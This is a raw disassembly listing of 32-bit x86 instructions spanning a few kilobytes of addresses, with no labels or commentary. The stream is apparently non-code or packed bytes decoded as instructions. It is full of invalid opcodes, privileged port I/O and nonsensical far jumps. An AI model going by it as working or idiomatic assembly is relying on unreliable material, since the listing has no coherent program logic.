  41705e:	shl    BYTE PTR [edx-0x4fdfca9c],1
  417064:	pop    ss
  417065:	jmp    0x4170e2
  417067:	fadd   st,st(4)
  417069:	jns    0x417035
  41706b:	and    BYTE PTR [ebx],dh
  41706d:	cs aad 0xc6
  417070:	xchg   ecx,eax
  417071:	push   ebx
  417072:	leave  
  417073:	in     al,dx
  417074:	repnz ficomp DWORD PTR [edi]
  417077:	mov    edx,0x70817812
  41707c:	ss out 0xe4,eax
  41707f:	popa   
  417080:	(bad)  
  417081:	in     al,dx
  417082:	fstp   QWORD PTR [eax+ebx*4-0x9]
  417086:	aaa    
  417087:	cs js  0x417100
  41708a:	out    0xa7,eax
  41708c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41708d:	test   al,0x2e
  41708f:	aaa    
  417090:	xor    DWORD PTR [edx-0x53],edi
  417093:	les    edx,FWORD PTR [edi]
  417095:	repz xlat BYTE PTR ds:[ebx]
  417097:	mov    BYTE PTR ds:0x20b99637,bl
  41709d:	sub    BYTE PTR ds:0x3693f31f,ch
  4170a3:	mov    ds:0x9b556712,al
  4170a8:	pop    eax
  4170a9:	in     al,0x95
  4170ab:	jecxz  0x417120
  4170ad:	pop    edi
  4170ae:	push   0x32a49f4d
  4170b3:	aam    0xd5
  4170b5:	push   0xffffff98
  4170b7:	mov    esi,0xfc138686
  4170bc:	mov    ebx,esp
  4170be:	mov    ds:0xecf01e1,eax
  4170c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c4:	rol    DWORD PTR [edx-0x46],1
  4170c7:	add    DWORD PTR [esi+0x61b0e4c0],0xaaad2ed3
  4170d1:	sbb    dh,BYTE PTR [esi+0x3933c4a6]
  4170d7:	cwde   
  4170d8:	(bad)  
  4170da:	call   0xe620ddb5
  4170df:	outs   dx,DWORD PTR ds:[esi]
  4170e0:	int3   
  4170e1:	sbb    al,0x60
  4170e3:	int    0xb9
  4170e5:	fwait
  4170e6:	(bad)  
  4170e7:	xor    dh,BYTE PTR [ebp-0x2]
  4170ea:	test   BYTE PTR [ecx-0xf0467ea],dl
  4170f0:	stos   BYTE PTR es:[edi],al
  4170f1:	mov    esi,0x8b088092
  4170f6:	outs   dx,BYTE PTR ds:[esi]
  4170f7:	push   esp
  4170f8:	sbb    ecx,0xffffffcb
  4170fb:	mov    ch,0x10
  4170fd:	pushf  
  4170fe:	cmp    DWORD PTR [ebx],ebx
  417100:	sbb    eax,0x8773209b
  417105:	or     edi,DWORD PTR [edx+0x4e]
  417108:	rcl    DWORD PTR [eax+0x74b62de5],cl
  41710e:	or     eax,0x9a34a74f
  417113:	and    bl,BYTE PTR [edi-0x8282922]
  417119:	es test eax,0x52728556
  41711f:	dec    edi
  417120:	push   0x43
  417122:	mov    ebp,gs
  417124:	fcom   DWORD PTR [eax-0x5ebcb057]
  41712a:	sub    DWORD PTR [edi+0x17bb0f5d],esi
  417130:	sub    ebx,edi
  417132:	push   esp
  417133:	xor    ch,ch
  417135:	mov    ch,0x7
  417137:	push   eax
  417138:	pop    ss
  417139:	aad    0xf8
  41713b:	pop    ds
  41713c:	sub    DWORD PTR [esi-0x6c054b9c],edi
  417142:	popf   
  417143:	add    cl,BYTE PTR [eax-0x1a63c0d1]
  417149:	mov    edi,0xfbf75833
  41714e:	sbb    ebx,DWORD PTR [esi]
  417150:	add    ebp,DWORD PTR [esi]
  417152:	mov    al,ds:0xa670341c
  417158:	pop    eax
  417159:	sbb    ch,BYTE PTR [edi]
  41715b:	bound  esi,QWORD PTR [edi+0x7]
  41715e:	repnz retf 
  417160:	add    edi,DWORD PTR [edi+0x70]
  417163:	push   eax
  417164:	pop    es
  417165:	in     eax,0x29
  417167:	mov    eax,0x2d49f58e
  41716c:	push   eax
  41716d:	jo     0x417161
  41716f:	mov    esi,0xc674214d
  417174:	outs   dx,BYTE PTR ds:[esi]
  417175:	pusha  
  417176:	imul   esi,edx,0x75
  417179:	fistp  DWORD PTR [edi+0x41]
  41717c:	cmp    BYTE PTR [esi+ecx*8],0x60
  417180:	clc    
  417181:	test   DWORD PTR [ebp-0x449a366f],edx
  417187:	dec    eax
  417188:	xchg   edx,eax
  417189:	aam    0x74
  41718b:	xchg   ecx,eax
  41718c:	mov    bh,0x73
  41718e:	fbld   TBYTE PTR [ecx+eax*1]
  417191:	je     0x417175
  417193:	sbb    bh,BYTE PTR [ebx+0x4d]
  417196:	aam    0x44
  417198:	mov    ebx,0xe54b3922
  41719d:	jecxz  0x4171aa
  41719f:	jne    0x4171e4
  4171a1:	inc    edx
  4171a2:	xchg   esp,eax
  4171a3:	mov    al,ds:0xe3d58956
  4171a8:	gs jg  0x4171b3
  4171ab:	ins    DWORD PTR es:[edi],dx
  4171ac:	daa    
  4171ad:	inc    ebx
  4171ae:	loop   0x417194
  4171b0:	add    ecx,edi
  4171b2:	sub    al,0xf8
  4171b4:	xor    eax,0x336ddbb9
  4171b9:	jae    0x41723a
  4171bb:	sahf   
  4171bc:	xchg   edx,eax
  4171bd:	fmul   QWORD PTR ds:[eax+edi*4-0x7d]
  4171c2:	(bad)  
  4171c4:	mov    ecx,0xd070c560
  4171c9:	sub    al,0x5b
  4171cb:	aas    
  4171cc:	pop    esi
  4171ce:	adc    eax,DWORD PTR [ecx+esi*2]
  4171d1:	sbb    al,0x5f
  4171d3:	cmp    eax,0x80e0a0a
  4171d8:	push   esi
  4171d9:	mov    bl,0x30
  4171db:	test   ch,dl
  4171dd:	mov    ch,0x28
  4171df:	pop    ecx
  4171e0:	adc    DWORD PTR [edx],ebx
  4171e2:	pop    esi
  4171e3:	push   ss
  4171e4:	int3   
  4171e5:	cmp    bl,dl
  4171e7:	and    eax,0xd68248d9
  4171ec:	out    0x78,eax
  4171ee:	mov    ebx,0x6fb7e564
  4171f3:	icebp  
  4171f4:	gs popf 
  4171f6:	int3   
  4171f7:	and    al,0xa6
  4171f9:	mov    ah,0xb
  4171fb:	les    ecx,FWORD PTR [edx+0x7f]
  4171fe:	arpl   WORD PTR [edi-0x45],di
  417201:	dec    esp
  417202:	xor    eax,0xeab91a57
  417207:	mov    ah,bl
  417209:	repz loopne 0x41727a
  41720c:	out    dx,eax
  41720d:	(bad)  [ebx-0x51]
  417210:	mov    cl,BYTE PTR [eax-0x6a]
  417213:	mov    edx,0xac386
  417218:	adc    al,0x61
  41721a:	nop
  41721b:	push   eax
  41721c:	lea    edi,[eax+ebx*1+0x11]
  417220:	add    al,0x2d
  417222:	js     0x417201
  417224:	jge    0x41727e
  417226:	push   ebp
  417227:	ins    BYTE PTR es:[edi],dx
  417228:	call   0x2f6b:0x30bdeb64
  41722f:	adc    al,ch
  417231:	or     eax,0x5d640bd
  417236:	sbb    bl,BYTE PTR [ecx]
  417238:	clc    
  417239:	mov    al,0x2e
  41723b:	add    eax,0xad5015af
  417240:	or     BYTE PTR [ecx],dh
  417242:	mov    BYTE PTR [eax-0x3c11539d],al
  417248:	mov    edi,0xa93d940c
  41724d:	mov    ds:0x77e2c1a3,al
  417252:	fwait
  417253:	test   BYTE PTR [edx],al
  417255:	cld    
  417256:	pop    edx
  417257:	pop    ebx
  417258:	test   al,0x48
  41725a:	call   0x6e99:0x95ce51ab
  417261:	cmp    BYTE PTR [edi],0x57
  417264:	push   ebp
  417265:	xchg   BYTE PTR [edi+0x1c],ah
  417268:	xchg   ecx,eax
  417269:	adc    DWORD PTR [eax-0x40],eax
  41726c:	jecxz  0x4172b6
  41726e:	jne    0x41723e
  417270:	sub    bh,al
  417272:	fiadd  WORD PTR [ecx+0x6fb1ccd1]
  417278:	dec    eax
  417279:	stc    
  41727a:	(bad)  
  41727c:	fsubr  DWORD PTR [edx+0x9587c76]
  417282:	mov    esi,0x4c996c50
  417287:	pushf  
  417288:	pop    edx
  417289:	sbb    esi,DWORD PTR [edi+0x4b49da0c]
  41728f:	mov    eax,DWORD PTR [ebp-0x51c3e8b7]
  417295:	sti    
  417296:	pop    edi
  417297:	js     0x4172a3
  417299:	jmp    0x74b4:0xd9bee22f
  4172a0:	xor    dl,BYTE PTR [edi+eiz*2+0x6b4e87fb]
  4172a7:	xchg   ebp,eax
  4172a8:	nop
  4172a9:	aad    0x1a
  4172ab:	cdq    
  4172ac:	sbb    eax,0xc569f0d7
  4172b1:	adc    al,0x25
  4172b3:	cld    
  4172b4:	ja     0x417298
  4172b6:	dec    edi
  4172b7:	(bad)
  4172ba:	mov    ebx,DWORD PTR [ebx+0x1a70234b]
  4172c0:	shl    DWORD PTR [edi+0x5c087f9c],cl
  4172c6:	lahf   
  4172c7:	and    eax,DWORD PTR [ebp+edi*1-0x2e]
  4172cb:	mov    ebx,DWORD PTR [esp+eax*1]
  4172ce:	addr16 arpl bp,sp
  4172d1:	fbstp  TBYTE PTR [eax]
  4172d3:	mov    ebp,0x928515fa
  4172d8:	mov    bh,0x5b
  4172da:	outs   dx,DWORD PTR ds:[esi]
  4172db:	xchg   esi,eax
  4172dc:	pop    ss
  4172dd:	int    0xb6
  4172df:	daa    
  4172e0:	or     eax,0x4d529539
  4172e5:	stos   DWORD PTR es:[edi],eax
  4172e6:	mov    al,ds:0xfeac17cb
  4172eb:	lods   al,BYTE PTR ds:[esi]
  4172ed:	push   cs
  4172ee:	retf   0xa20b
  4172f1:	dec    edi
  4172f2:	cld    
  4172f3:	test   al,0x9f
  4172f5:	xchg   edx,eax
  4172f6:	xchg   edi,eax
  4172f7:	popf   
  4172f8:	in     eax,dx
  4172f9:	pusha  
  4172fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172fb:	fbstp  TBYTE PTR [edi-0x33]
  4172fe:	cli    
  4172ff:	lods   al,BYTE PTR ds:[esi]
  417300:	xor    BYTE PTR [eax],ah
  417302:	clc    
  417303:	hlt    
  417304:	or     ch,ah
  417306:	ror    bh,cl
  417308:	in     eax,0xf3
  41730a:	imul   ebx,DWORD PTR [edx-0x33],0x4d
  41730e:	enter  0x406b,0x23
  417312:	mov    al,ds:0x5eefe680
  417317:	inc    edx
  417318:	and    esp,edi
  41731a:	or     bl,BYTE PTR [edx]
  41731c:	ins    BYTE PTR es:[edi],dx
  41731d:	mov    dl,0xe1
  41731f:	mov    dh,0xfa
  417321:	cs cmc 
  417323:	sbb    al,0x4c
  417325:	shl    BYTE PTR [ecx],cl
  417327:	add    BYTE PTR [edi+0x26],bh
  41732a:	stos   DWORD PTR es:[edi],eax
  41732b:	mov    ds:0x645b6f47,al
  417330:	ins    DWORD PTR es:[edi],dx
  417331:	and    DWORD PTR [edi+0x43],esi
  417334:	or     al,0x29
  417336:	mov    ecx,0xfe52ea0c
  41733b:	add    edi,DWORD PTR [edi]
  41733d:	ss push eax
  41733f:	mov    al,0x3d
  417341:	test   DWORD PTR ds:0x57dc6786,eax
  417347:	popa   
  417348:	cmp    al,ch
  41734a:	pop    edi
  41734b:	mov    ah,0x9a
  41734d:	mov    ds:0xfb0cf5bb,al
  417352:	call   DWORD PTR [ebx-0x4fe4b896]
  417358:	cwde   
  417359:	ror    DWORD PTR [ebx+0xd],0x6f
  41735d:	adc    edx,DWORD PTR [esi]
  41735f:	sub    ecx,eax
  417361:	mov    cs,WORD PTR [edx+0x2f]
  417364:	xor    edi,DWORD PTR ds:[edx]
  417367:	pop    esp
  417368:	test   edx,edi
  41736a:	or     esp,DWORD PTR [edx+0x3476e05f]
  417370:	ds ret 
  417372:	clc    
  417373:	lahf   
  417374:	jne    0x41735e
  417376:	mov    al,BYTE PTR [esi+0x5a62c5ed]
  41737c:	inc    eax
  41737d:	js     0x417384
  41737f:	icebp  
  417380:	loopne 0x417343
  417382:	mov    eax,ds:0x8e885076
  417387:	les    esi,FWORD PTR [edx*2+0x59b670d5]
  41738e:	and    DWORD PTR ds:0xcdbb9de4,0xffffffdf
  417395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417396:	int    0x67
  417398:	imul   eax,DWORD PTR [ecx],0xffffffe3
  41739b:	call   FWORD PTR [eax]
  41739d:	aas    
  41739e:	inc    edx
  41739f:	mov    esi,0x54316875
  4173a4:	gs sahf 
  4173a6:	jle    0x4173b2
  4173a8:	popa   
  4173a9:	test   eax,0xdb425619
  4173ae:	and    eax,0xd4d687a4
  4173b3:	cwde   
  4173b4:	jae    0x417429
  4173b6:	loopne 0x4173ed
  4173b8:	mov    dl,0xe
  4173ba:	lods   eax,DWORD PTR ds:[esi]
  4173bb:	ja     0x417396
  4173bd:	adc    ah,al
  4173bf:	push   es
  4173c0:	pop    esp
  4173c1:	or     BYTE PTR [esi],bl
  4173c3:	add    bh,BYTE PTR [edi*1+0x48cb6c46]
  4173ca:	ret    
  4173cb:	push   esp
  4173cc:	jnp    0x4173e0
  4173ce:	aas    
  4173cf:	in     eax,dx
  4173d0:	jle    0x417442
  4173d2:	fimul  DWORD PTR [ebp-0x447e0a35]
  4173d8:	fdiv   DWORD PTR ds:0x763e9569
  4173de:	iret   
  4173df:	or     BYTE PTR [edx+0x3d],al
  4173e2:	xchg   esi,eax
  4173e3:	pop    eax
  4173e4:	cmp    ebp,DWORD PTR [ebp+ecx*8-0x64e8a6f4]
  4173eb:	fwait
  4173ec:	pop    esp
  4173ed:	mov    DWORD PTR [ebx],edx
  4173ef:	imul   ebx,DWORD PTR [ecx+0x76],0xffffffe2
  4173f3:	dec    eax
  4173f4:	jnp    0x417462
  4173f6:	stc    
  4173f7:	fwait
  4173f8:	dec    edx
  4173f9:	cs sti 
  4173fb:	(bad)  
  4173fc:	fisttp QWORD PTR [edx+0x490218d8]
  417402:	xlat   BYTE PTR ds:[ebx]
  417403:	and    BYTE PTR [eax-0x75700924],0x8b
  41740a:	leave  
  41740b:	pop    esp
  41740c:	out    0xe8,al
  41740e:	in     eax,dx
  41740f:	fs aam 0x50
  417412:	xchg   esi,eax
  417413:	call   0x7ecae099
  417418:	rol    DWORD PTR [ecx+0x57],cl
  41741b:	test   BYTE PTR [esi],al
  41741d:	dec    ebx
  41741e:	scas   eax,DWORD PTR es:[edi]
  41741f:	mov    ebp,0x843688fb
  417424:	and    DWORD PTR [edi],0x2e
  417427:	std    
  417428:	xor    eax,0x51436d4c
  41742d:	pop    esp
  41742e:	mov    bl,0x92
  417430:	lahf   
  417431:	push   ecx
  417432:	idiv   BYTE PTR [esi]
  417434:	jl     0x4173dc
  417436:	and    bh,dl
  417438:	jo     0x4174a0
  41743a:	adc    BYTE PTR [edi-0x6c85dd5d],bh
  417440:	mov    esi,0x625c7373
  417445:	ficom  WORD PTR [eax-0x3a]
  417448:	aas    
  417449:	js     0x4173f8
  41744b:	pop    ecx
  41744c:	pop    eax
  41744d:	xor    DWORD PTR [edx+eax*4-0x24e06156],eax
  417454:	dec    esp
  417455:	rcr    BYTE PTR [edx],1
  417457:	sbb    cl,BYTE PTR [ecx]
  417459:	sub    eax,0xa2dd117f
  41745e:	ins    BYTE PTR es:[edi],dx
  41745f:	inc    ebx
  417460:	pop    ss
  417461:	cwde   
  417462:	mov    al,0xb9
  417464:	out    dx,al
  417465:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  417467:	and    cl,BYTE PTR [ebp-0x60837817]
  41746d:	pop    ecx
  41746e:	xor    BYTE PTR [ecx+ebx*4-0x75],0xd2
  417473:	aas    
  417474:	stc    
  417475:	fidiv  DWORD PTR [eax]
  417477:	lahf   
  417478:	outs   dx,DWORD PTR ds:[esi]
  417479:	push   ss
  41747a:	stos   DWORD PTR es:[edi],eax
  41747b:	push   ss
  41747c:	push   eax
  41747d:	mov    edx,0xff79fd66
  417482:	xchg   ebx,eax
  417483:	jo     0x417448
  417485:	mov    BYTE PTR [edx+ebx*2-0x3f715325],bh
  41748c:	push   0x48fabc24
  417491:	out    dx,eax
  417492:	int    0x83
  417494:	jbe    0x41750d
  417496:	xchg   esi,eax
  417497:	dec    ebx
  417498:	lea    edx,[eax+0x742305ff]
  41749e:	dec    eax
  41749f:	inc    edx
  4174a0:	push   ebp
  4174a1:	imul   ecx,DWORD PTR [edx],0xffffff8c
  4174a4:	or     DWORD PTR [ebx],0x4b788f91
  4174aa:	xlat   BYTE PTR ds:[ebx]
  4174ab:	in     eax,dx
  4174ac:	shl    DWORD PTR [esi+ecx*1+0x21],0xf7
  4174b1:	xchg   DWORD PTR [ebx+0x362641c6],esp
  4174b7:	sar    ah,cl
  4174b9:	inc    ebp
  4174ba:	imul   ecx,esi,0x3fc12637
  4174c0:	jmp    0x25c74b3e
  4174c5:	aaa    
  4174c6:	into   
  4174c7:	add    eax,0x4bcbd41f
  4174cc:	in     eax,0xe2
  4174ce:	xchg   ebp,eax
  4174cf:	jmp    0x4174d4
  4174d1:	jge    0x41751c
  4174d3:	pop    ss
  4174d4:	inc    esp
  4174d5:	fwait
  4174d6:	push   eax
  4174d7:	xor    eax,ebx
  4174d9:	sub    DWORD PTR [eax],esi
  4174db:	dec    BYTE PTR [ebx]
  4174dd:	sti    
  4174de:	xchg   ebx,eax
  4174df:	dec    edx
  4174e0:	cdq    
  4174e1:	imul   BYTE PTR ds:[ebx-0x65]
  4174e5:	add    BYTE PTR [ebp+eax*4+0x61],ah
  4174e9:	inc    esp
  4174ea:	jg     0x41747d
  4174ec:	push   0xfffffffa
  4174ee:	cmp    ebp,esi
  4174f0:	pushf  
  4174f1:	adc    BYTE PTR [ecx-0xe],0x12
  4174f5:	fisttp QWORD PTR [ecx]
  4174f7:	jno    0x417532
  4174f9:	jp     0x41752f
  4174fb:	jno    0x41749c
  4174fd:	sbb    dl,BYTE PTR ds:0x2ecacac8
  417503:	pop    esi
  417504:	pushf  
  417505:	ret    0xbc28
  417508:	add    eax,0x7c0b71b3
  41750d:	(bad)  
  41750e:	xchg   edi,eax
  41750f:	cmp    al,0x9a
  417511:	dec    edx
  417512:	cwde   
  417513:	adc    cl,dl
  417515:	sbb    DWORD PTR [ebp+0x55],edx
  417518:	push   es
  417519:	sar    DWORD PTR [eax+esi*1],0x4c
  41751d:	lock mov ecx,0x78a86961
  417523:	test   DWORD PTR ds:[eax+0x3bf62a04],0x55556314
  41752e:	dec    eax
  41752f:	std    
  417530:	adc    bl,BYTE PTR [eax+0x7524b974]
  417536:	inc    eax
  417537:	cdq    
  417538:	in     eax,0xb6
  41753a:	loopne 0x417584
  41753c:	sub    bh,BYTE PTR [edi+eiz*2]
  41753f:	xchg   esp,eax
  417540:	je     0x4174d1
  417542:	in     al,dx
  417543:	adc    ebp,ebp
  417545:	xchg   ebp,eax
  417546:	cmp    BYTE PTR [eax],bh
  417548:	ins    DWORD PTR es:[edi],dx
  417549:	inc    ecx
  41754a:	mov    edi,0xcfc8e00e
  41754f:	test   eax,0xfec0689d
  417554:	les    esp,FWORD PTR [ebx-0x4eb0dde]
  41755a:	mov    BYTE PTR [ebp+0xbe4daf8],ah
  417560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417561:	pop    edi
  417562:	mov    al,0xe6
  417564:	jmp    0xb3af648a
  417569:	add    ah,BYTE PTR [ebp+edi*1-0x1efaca37]
  417570:	std    
  417571:	mov    ch,0x7
  417573:	not    DWORD PTR [ebp+edx*2-0x373663ec]
  41757a:	(bad)  
  41757b:	bnd ret 
  41757d:	mov    eax,0x38eb8e3d
  417582:	rol    ebp,0x19
  417585:	mov    bl,al
  417587:	(bad)
  41758a:	(bad)  
  41758b:	fimul  DWORD PTR [edi+0x7202a87d]
  417591:	ror    ecx,0xd
  417594:	add    DWORD PTR [esi+ebp*8+0x1ace8367],esp
  41759b:	ror    dl,1
  41759d:	icebp  
  41759e:	(bad)  
  4175a0:	or     BYTE PTR [ebx],0x4a
  4175a3:	mov    ch,0x9e
  4175a5:	mov    eax,ds:0xc2588ff1
  4175aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ab:	mov    WORD PTR [edx+0xa],?
  4175ae:	adc    al,0xff
  4175b0:	ret    
  4175b1:	mov    cl,0x1e
  4175b3:	ins    BYTE PTR es:[edi],dx
  4175b4:	sahf   
  4175b5:	iret   
  4175b6:	inc    edx
  4175b7:	dec    eax
  4175b8:	outs   dx,DWORD PTR ds:[esi]
  4175b9:	out    dx,eax
  4175ba:	fst    DWORD PTR [edi]
  4175bc:	dec    edi
  4175bd:	push   edi
  4175be:	int    0x58
  4175c0:	push   edx
  4175c1:	les    ebx,FWORD PTR [esi+0x1d]
  4175c4:	push   cs
  4175c5:	jb     0x4175e2
  4175c7:	dec    edi
  4175c8:	daa    
  4175c9:	pusha  
  4175ca:	cwde   
  4175cb:	push   eax
  4175cc:	imul   ebp,ebp,0xd34dd85a
  4175d2:	sbb    edx,DWORD PTR [ecx+0x2b]
  4175d5:	jge    0x417589
  4175d7:	mov    eax,ds:0xccc38d72
  4175dc:	out    0x1e,al
  4175de:	and    edx,DWORD PTR [esi-0x51]
  4175e1:	and    eax,0x82980e82
  4175e6:	loope  0x417569
  4175e8:	pop    ebx
  4175e9:	bound  ecx,QWORD PTR [eax]
  4175eb:	mov    ecx,0xb585de7f
  4175f0:	test   DWORD PTR [ebx],esi
  4175f2:	cmp    DWORD PTR [esi-0x554bdd53],esp
  4175f8:	(bad)  
  4175f9:	loopne 0x4175f0
  4175fb:	fwait
  4175fc:	data16 sbb BYTE PTR [eax],dl
  4175ff:	pop    es
  417600:	fnsave [ebx-0x69]
  417603:	sbb    al,0x96
  417605:	pop    esp
  417606:	in     al,dx
  417607:	push   eax
  417608:	icebp  
  417609:	sbb    DWORD PTR ds:0xe122d127,esi
  41760f:	lods   al,BYTE PTR ds:[esi]
  417610:	aaa    
  417611:	and    bh,BYTE PTR [ecx]
  417613:	fnstenv [edi]
  417615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417616:	pop    ebx
  417617:	cs jp  0x4175eb
  41761a:	push   es
  41761b:	stos   BYTE PTR es:[edi],al
  41761c:	shl    dl,0xb7
  41761f:	call   0x2029388d
  417624:	shl    edi,1
  417626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417627:	mov    ds:0xc4517ab3,al
  41762c:	das    
  41762d:	arpl   WORD PTR [ebp+0x41],ax
  417630:	mov    ds:0x5b08fc7e,al
  417635:	xor    ch,BYTE PTR [edx+0x42]
  417638:	add    eax,0xa282bee8
  41763d:	(bad)  
  41763e:	push   ss
  41763f:	mov    al,0xe
  417641:	sub    ah,al
  417643:	(bad)  
  417644:	sar    esp,1
  417646:	pop    DWORD PTR [ecx+eiz*1]
  417649:	sub    bl,BYTE PTR [eax-0x78ebf2b3]
  41764f:	dec    ebp
  417650:	xchg   BYTE PTR [ebp-0x77],ch
  417653:	mov    ecx,0xd23f763a
  417658:	loop   0x4176bc
  41765a:	fcmovne st,st(3)
  41765c:	push   es
  41765d:	xchg   BYTE PTR [ebx+0xea69b1f],ch
  417663:	mov    al,0x1c
  417665:	pop    edi
  417666:	add    cl,BYTE PTR [ebx]
  417668:	imul   eax,DWORD PTR [esi-0x31805f5f],0xffffff94
  41766f:	rcr    BYTE PTR [eax+0x67b54c37],cl
  417675:	outs   dx,DWORD PTR ds:[esi]
  417676:	jle    0x4176f4
  417678:	inc    ecx
  417679:	fdiv   QWORD PTR es:[esi-0x31]
  41767d:	jns    0x41765c
  41767f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417680:	xor    DWORD PTR [eiz*4+0xd4bcee1],edx
  417687:	mov    eax,ds:0x3e78fd3e
  41768c:	imul   eax,DWORD PTR [edi-0x5d53c656],0xffffffed
  417693:	loope  0x417620
  417695:	push   edx
  417696:	gs (bad) 
  417698:	int    0x1
  41769a:	push   es
  41769b:	test   ebp,edx
  41769d:	cli    
  41769e:	mov    bh,0x2e
  4176a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176a1:	push   eax
  4176a2:	(bad)  
  4176a3:	mov    WORD PTR [edi],cs
  4176a5:	xor    eax,0x4f2eb3bd
  4176aa:	pusha  
  4176ab:	adc    dh,BYTE PTR [edi-0x92d1d1a]
  4176b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176b2:	pop    es
  4176b3:	jmp    0xf20c:0x5d2c5b8e
  4176ba:	sar    DWORD PTR [edi],0x2c
  4176bd:	jl     0x417706
  4176bf:	sbb    al,0x81
  4176c1:	push   edx
  4176c2:	cmp    al,0xce
  4176c4:	enter  0xaaf0,0x53
  4176c8:	test   DWORD PTR [ecx-0x6e70def6],eax
  4176ce:	jno    0x41766a
  4176d0:	mov    dh,0xc6
  4176d2:	sti    
  4176d3:	inc    esi
  4176d4:	add    al,0x4e
  4176d6:	xchg   esi,eax
  4176d7:	mov    ss,WORD PTR [ebp-0x4930787d]
  4176dd:	ror    BYTE PTR [eax+esi*1],1
  4176e0:	sbb    edi,DWORD PTR [eax]
  4176e2:	mov    cl,0xc6
  4176e4:	loop   0x417694
  4176e6:	cmp    ebx,ecx
  4176e8:	mov    WORD PTR [ecx],fs
  4176ea:	and    al,0x72
  4176ec:	sub    edi,esi
  4176ee:	sub    edi,ecx
  4176f0:	and    eax,0xebea54f
  4176f5:	ins    BYTE PTR es:[edi],dx
  4176f6:	out    dx,al
  4176f7:	xor    dl,BYTE PTR [edi-0x6]
  4176fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176fb:	mov    ebx,0x6b207ad2
  417700:	jmp    0x417694
  417702:	dec    ebp
  417703:	xor    ebx,DWORD PTR [eax]
  417705:	aad    0xdb
  417707:	dec    edx
  417708:	or     DWORD PTR [edx+0xf1c7677],ecx
  41770e:	pop    es
  41770f:	add    esi,ebx
  417711:	push   es
  417712:	out    dx,al
  417713:	or     eax,0x97e50332
  417718:	das    
  417719:	sub    eax,DWORD PTR [edx]
  41771b:	fcomip st,st(3)
  41771d:	mov    ebp,0xd8a8a3ec
  417722:	mov    ds:0xfb9c563a,eax
  417727:	(bad)  [ecx-0x7d4d7f46]
  41772d:	out    0x39,al
  41772f:	popa   
  417730:	gs push ds
  417732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417733:	cmp    ah,BYTE PTR [ecx-0x7ec6805c]
  417739:	adc    DWORD PTR [ebp+ebx*1-0x5a016da5],ebp
  417740:	inc    ebx
  417741:	jo     0x41772d
  417743:	shl    DWORD PTR [edi],cl
  417745:	or     eax,0x2dfa18a1
  41774a:	je     0x417738
  41774c:	add    ch,BYTE PTR [edi-0x64]
  41774f:	popf   
  417750:	mov    esp,0x9453545c
  417755:	ss push cs
  417757:	fimul  DWORD PTR [ebp+0x67]
  41775a:	fld    QWORD PTR [ebp-0x5b]
  41775d:	xor    dh,BYTE PTR [ebx-0x25f0a565]
  417763:	cmp    BYTE PTR [ebp+0x68e47a7b],0xe0
  41776a:	and    DWORD PTR [edi+0x7e607189],0x18
  417771:	bound  eax,QWORD PTR [edx-0x6b]
  417774:	sub    eax,DWORD PTR [esi+0x52]
  417777:	das    
  417778:	push   ss
  417779:	mov    ah,0xad
  41777b:	xchg   edx,eax
  41777c:	or     eax,0xa94a3029
  417781:	inc    eax
  417782:	sub    BYTE PTR [esi],ch
  417784:	test   DWORD PTR [ecx+0x5c],esi
  417787:	jmp    0xd308:0x522b7ab
  41778e:	push   edi
  41778f:	rcr    eax,cl
  417791:	out    0x45,eax
  417793:	fistp  DWORD PTR [edx+ebp*4]
  417796:	mov    eax,0x8a2bf712
  41779b:	xchg   ebx,eax
  41779c:	jns    0x417772
  41779e:	sub    DWORD PTR [edi+0x4a],esp
  4177a1:	mov    ah,0x40
  4177a3:	inc    BYTE PTR [eax-0x18]
  4177a6:	jns    0x4177d1
  4177a8:	das    
  4177a9:	mov    ecx,0x8d7cfa93
  4177ae:	outs   dx,DWORD PTR ds:[esi]
  4177af:	mov    al,BYTE PTR [ecx+0x6b858255]
  4177b5:	ficom  DWORD PTR [eax]
  4177b7:	sub    DWORD PTR [ebx-0x4d],0xf
  4177bb:	pop    ecx
  4177bc:	cwde   
  4177bd:	fdivr  DWORD PTR [eax+0x23]
  4177c0:	sub    eax,0xa91c2eea
  4177c5:	cmp    DWORD PTR [ecx+eiz*4-0x67619e0b],esp
  4177cc:	push   edi
  4177cd:	dec    ebp
  4177ce:	push   edi
  4177cf:	test   al,0x30
  4177d1:	inc    ebp
  4177d2:	fist   DWORD PTR [edi+eax*1+0x1d704485]
  4177d9:	test   esp,ecx
  4177db:	(bad)  
  4177dc:	jp     0x4177d2
  4177de:	jle    0x4177f1
  4177e0:	imul   eax,edi,0xce4465bb
  4177e6:	and    al,0xc5
  4177e8:	mov    eax,0x75a02c3e
  4177ed:	jmp    0x417821
  4177ef:	call   0x61ad:0x3ac28ba3
  4177f6:	sbb    edx,ebp
  4177f8:	std    
  4177f9:	adc    ebp,DWORD PTR [edi-0x7f]
  4177fc:	pop    esi
  4177fd:	test   BYTE PTR [edx],bh
  4177ff:	bound  eax,QWORD PTR [ebx]
  417801:	and    al,0xec
  417803:	gs jns 0x4177b3
  417806:	jnp    0x417858
  417808:	inc    ebx
  417809:	and    esi,DWORD PTR [eax+edx*2]
  41780c:	pop    ebp
  41780d:	and    eax,0xea694994
  417812:	push   es
  417813:	pop    esp
  417814:	enter  0xda4b,0x36
  417818:	push   ds
  417819:	idiv   BYTE PTR [edx+0x5f]
  41781c:	dec    ebx
  41781d:	or     eax,0x15eb29c
  417822:	in     al,dx
  417823:	sbb    DWORD PTR [eax-0x46710a57],edi
  417829:	add    eax,DWORD PTR [edi+ebx*1+0x42db4bc3]
  417830:	push   ds
  417831:	popa   
  417832:	int    0x17
  417834:	jb     0x4177c3
  417836:	jb     0x4177c0
  417838:	out    dx,al
  417839:	daa    
  41783a:	loope  0x4178a3
  41783c:	and    eax,0x46c18e8c
  417841:	pop    ebp
  417842:	mov    bl,0x4e
  417844:	mov    ah,0xb6
